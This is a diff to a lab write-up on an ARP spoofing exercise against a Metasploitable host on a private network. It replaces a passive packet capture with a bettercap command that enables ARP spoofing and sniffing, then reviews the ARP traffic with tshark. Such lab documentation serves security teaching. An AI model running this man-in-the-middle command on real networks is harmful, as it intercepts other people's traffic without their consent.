@@ -6,6 +6,8 @@
 - Target: Metasploitable (IP `192.168.1.138`)
 - Gateway: `192.168.1.1`
 
+![ARP Spoofing Capture](images/arp-spoof.png)
+
 ---
 
 ## 1. Network Traffic Capture (Data Collection)
@@ -13,15 +15,15 @@
 **Command:**
 
 ```bash
-sudo tshark -i eth0 -w arp-spoof.pcapng
+sudo bettercap -eval "set targets 192.168.1.138; arp.spoof on; net.sniff on"
 ```
 
 **What it does:**
-Starts capturing all packets passing through the `eth0` interface and saves them to the file `arp-spoof.pcapng`. This allows for later forensic analysis of the traffic.
+Uses Bettercap to perform ARP spoofing and capture traffic from the target. Kali positions itself as the Man-in-the-Middle and records packets passing through the attacker machine.
 
 ---
 
-## 2. Initial Analysis of ARP Packets
+## 2. Review and Save Output with tshark
 
 **Command:**
 
@@ -30,7 +32,7 @@ sudo tshark -r /tmp/arp-spoof.pcapng -Y "arp" | head -10
 ```
 
 **What it does:**
-Reads the `.pcapng` file generated in the previous step, filters only **ARP** protocol packets, and displays the first 10 lines. This step confirms that the network is exchanging ARP messages (Requests, Replies, Gratuitous ARP) between devices.
+Reads the capture file, filters ARP packets, and displays the first 10 lines. This verifies the ARP traffic seen during the attack and allows the output to be redirected into a file for saved analysis.
 
 ---
 
